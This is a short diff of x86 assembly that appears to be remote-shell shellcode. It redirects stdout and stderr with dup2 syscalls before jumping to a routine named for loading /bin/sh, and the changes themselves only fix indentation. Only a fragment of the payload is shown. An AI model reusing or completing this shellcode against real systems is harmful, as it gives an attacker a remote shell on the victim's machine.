@@ -78,18 +78,18 @@ _start:
 	int 0x80
 
 	xor eax, eax
-    mov al, 0x3f;            63 for dup2 syscall
+	mov al, 0x3f;            63 for dup2 syscall
 
 	mov cl, 0x01;             1 for stdout 
 
 	int 0x80
 
 	xor eax, eax
-    mov al, 0x3f;            63 for dup2 syscall
+    	mov al, 0x3f;            63 for dup2 syscall
 
-    mov cl, 0x02;             2 for stderr
+    	mov cl, 0x02;             2 for stderr
 
-    int 0x80
+    	int 0x80
 
 	jmp short load_bin_sh_addr
 
